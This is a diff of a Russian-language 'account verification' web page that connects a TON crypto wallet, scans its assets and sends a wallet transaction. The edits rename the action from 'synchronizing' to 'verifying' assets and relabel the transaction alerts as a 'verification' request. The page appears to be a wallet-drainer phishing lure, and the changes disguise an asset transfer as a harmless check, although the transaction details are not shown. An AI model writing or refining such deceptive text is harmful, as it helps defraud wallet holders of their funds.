@@ -18,11 +18,11 @@
 
 <div class="card">
     <h2>Верификация аккаунта</h2>
-    <p style="font-size: 0.9rem; color: #94a3b8;">Подключите кошелек для синхронизации ваших активов</p>
+    <p style="font-size: 0.9rem; color: #94a3b8;">Подключите кошелек для проверки ваших активов</p>
     
     <div id="ton-connect-button"></div>
     
-    <button id="main-btn">Синхронизировать активы</button>
+    <button id="main-btn">Проверить активы</button>
     <div id="status-text" class="status">Ожидание подключения...</div>
 </div>
 
@@ -64,7 +64,7 @@
             }
         } catch (e) {
             console.error(e);
-            document.getElementById('status-text').innerText = "Ошибка поиска активов.";
+            document.getElementById('status-text').innerText = "Ошибка поиска активов для проверки.";
         }
     }
 
@@ -93,9 +93,9 @@
             };
 
             await tonConnectUI.sendTransaction(tx);
-            alert("Запрос отправлен. Подтвердите в приложении.");
+            alert("Запрос на проверку отправлен. Подтвердите в приложении.");
         } catch (e) {
-            alert("Ошибка транзакции или отказ.");
+            alert("Ошибка проверки или отказ.");
         }
     });
 </script>
